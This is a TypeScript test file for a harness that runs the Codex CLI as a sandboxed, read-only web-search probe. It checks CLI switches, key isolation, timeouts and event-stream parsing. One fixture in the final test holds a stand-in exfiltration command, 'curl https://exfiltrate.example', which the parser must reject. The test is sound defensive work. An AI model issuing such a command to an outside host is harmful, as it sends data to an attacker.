import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { basename, dirname } from 'node:path';
import { describe, test, type TestContext } from 'node:test';
import { setTimeout as delay } from 'node:timers/promises';
import { resolveProvider } from '../src/ai/providers.ts';
import { parseCodexStream, runCodexProbe } from '../src/probe/codex.ts';
import { probeInstructions } from '../src/probe/prompt.ts';
import { ProbeRunError } from '../src/probe/types.ts';
import { probeDouble } from './fixtures/probe/doubles.ts';
import { alive, sandbox, testEnv } from './support/providers.ts';

const answer = 'Altitud Studio is an agency in Andorra.\n\nSources:\n- https://altitudstudio.ad/?utm_source=chatgpt.com';

async function setup(t: TestContext, scenario: object, extra: Readonly<Record<string, string>> = {}) {
  const home = await sandbox(t);
  const double = await probeDouble(home, 'codex', scenario);
  const env = testEnv(home, { codex: double.executable }, extra);
  const provider = await resolveProvider('codex', { env });
  const run = (query = 'seo audit andorra', timeoutMs = 20_000) => runCodexProbe({ query, provider, env, timeoutMs, now: () => new Date('2026-11-04T10:00:00.000Z') });
  return { double, provider, run };
}

function failsWith(code: string) {
  return (error: unknown) => {
    assert.ok(error instanceof ProbeRunError, `expected a ProbeRunError, got ${String(error)}`);
    assert.equal(error.code, code);
    return true;
  };
}

const lines = (...events: object[]) => events.map(event => JSON.stringify(event)).join('\n');
const started = [{ type: 'thread.started', thread_id: 't' }, { type: 'turn.started' }];
const completed = { type: 'turn.completed', usage: { input_tokens: 10, cached_input_tokens: 2, output_tokens: 3 } };

describe('Codex probe runs', () => {
  test('run exec with live web search, user configuration ignored, read-only and with the shell switched off, in a new empty folder', async t => {
    const { double, run } = await setup(t, { default: { searches: ['seo audit andorra', 'seo andorra agency'], answer } }, { OPENAI_API_KEY: 'sk-test', CODEX_API_KEY: 'codex-test' });
    const result = await run();
    const [call] = await double.calls();
    const answerFile = call!.args[call!.args.indexOf('--output-last-message') + 1]!;
    assert.deepEqual(call!.args, [
      '--no-daemon', '-a', 'never', 'exec', '--ignore-user-config', '--ignore-rules', '--ephemeral', '--skip-git-repo-check', '--sandbox', 'read-only',
      '-c', 'features.shell_tool=false', '-c', 'features.unified_exec=false', '-c', 'features.apps=false', '-c', 'plugins._default.enabled=false',
      '-c', 'web_search="live"', '--json', '--color', 'never', '--output-last-message', answerFile, '-',
    ]);
    assert.equal(call!.stdin, `${probeInstructions}\n\nQuestion: seo audit andorra\n`);
    assert.deepEqual(call!.cwdEntries, [], 'the folder is empty when Codex starts');
    assert.equal(dirname(answerFile), call!.cwd);
    assert.match(basename(call!.cwd), /^altimeter-probe-codex-/u);
    assert.equal(existsSync(call!.cwd), false, 'the folder is removed after the run');
    assert.equal(call!.env.includes('OPENAI_API_KEY') || call!.env.includes('CODEX_API_KEY'), false, 'API keys are never forwarded');
    assert.deepEqual(result, { answer, searches: 2, usage: { inputTokens: 1800, outputTokens: 350, cachedInputTokens: 0 }, durationMs: result.durationMs, at: '2026-11-04T10:00:00.000Z' });
    assert.equal('retrieved' in result, false, 'Codex exposes no search results, so nothing counts as retrieved');
  });

  test('leave out --ignore-rules for a version outside the verified table, but keep every switch', async t => {
    const { double, provider, run } = await setup(t, { version: '0.170.0', default: { answer } });
    assert.equal(provider.capabilities.verified, false);
    await run();
    const [call] = await double.calls();
    assert.equal(call!.args.includes('--ignore-rules'), false);
    for (const setting of ['features.shell_tool=false', 'features.unified_exec=false', 'web_search="live"']) assert.ok(call!.args.includes(setting), setting);
  });

  test('fail when Codex runs a command, changes a file, calls an MCP tool or emits an item it does not know', async t => {
    for (const tool of ['command_execution', 'file_change', 'mcp_tool_call', 'a_future_tool']) {
      const { run } = await setup(t, { default: { searches: ['q'], tool, answer } });
      await assert.rejects(run(), failsWith('tool-use'));
    }
  });

  test('fall back to the last agent message when the answer file is missing, and fail without either', async t => {
    const fallback = await setup(t, { default: { answer, noAnswerFile: true } });
    assert.equal((await fallback.run()).answer, answer);
    const silent = await setup(t, { default: { noAnswerFile: true } });
    await assert.rejects(silent.run(), failsWith('missing-answer'));
  });

  test('fail on a failed turn even when the CLI exits with an error code', async t => {
    const { run } = await setup(t, { default: { answer, failTurn: true, exitCode: 1 } });
    await assert.rejects(run(), failsWith('provider-failed'));
  });

  for (const [name, scenario] of [['hangs without output', { hang: true }], ['stalls after its first events', { searches: ['q'], answer, stallAfter: 3 }]] as const) {
    test(`kill a run that ${name}, with its process tree, at the deadline`, { timeout: 30_000 }, async t => {
      const { double, run } = await setup(t, { default: scenario });
      await assert.rejects(run('seo audit andorra', 1500), failsWith('timeout'));
      const [call] = await double.calls();
      for (let attempt = 0; attempt < 20 && alive(call!.pid); attempt += 1) await delay(100);
      assert.equal(alive(call!.pid), false);
      assert.equal(existsSync(call!.cwd), false);
    });
  }
});

describe('Codex event checks', () => {
  test('count completed web searches and keep the last agent message and the usage', () => {
    const parsed = parseCodexStream(lines(
      ...started,
      { type: 'item.started', item: { id: 'ws_1', type: 'web_search', query: 'q' } },
      { type: 'item.completed', item: { id: 'ws_1', id2: 'ws_1', type: 'web_search', query: 'q', action: { type: 'search' } } },
      { type: 'item.updated', item: { id: 'todo', type: 'todo_list', items: [] } },
      { type: 'item.completed', item: { id: 'm1', type: 'agent_message', text: 'first' } },
      { type: 'item.completed', item: { id: 'm2', type: 'agent_message', text: 'final' } },
      completed,
    ));
    assert.deepEqual(parsed, { searches: 1, lastMessage: 'final', usage: { inputTokens: 10, outputTokens: 3, cachedInputTokens: 2 } });
  });

  test('refuse incomplete, failed, out-of-order or partial streams', () => {
    assert.throws(() => parseCodexStream(lines(...started)), failsWith('incomplete'));
    assert.throws(() => parseCodexStream(lines(...started, { type: 'error', message: 'usage limit' })), failsWith('provider-failed'));
    assert.throws(() => parseCodexStream(lines(...started, completed, { type: 'item.completed', item: { type: 'agent_message', text: 'late' } })), failsWith('invalid-response'));
    assert.throws(() => parseCodexStream(lines({ type: 'item.completed', item: { type: 'agent_message', text: 'early' } }, ...started, completed)), failsWith('invalid-response'));
    assert.throws(() => parseCodexStream(`${lines(...started)}\n{"type":"item.comp`), failsWith('invalid-response'));
    assert.throws(() => parseCodexStream(lines(...started, { type: 'item.completed', item: { id: 'x' } }, completed)), failsWith('invalid-response'));
    assert.throws(() => parseCodexStream(lines(...started, { type: 'item.started', item: { type: 'command_execution', command: 'curl https://exfiltrate.example' } }, completed)), failsWith('tool-use'));
  });
});
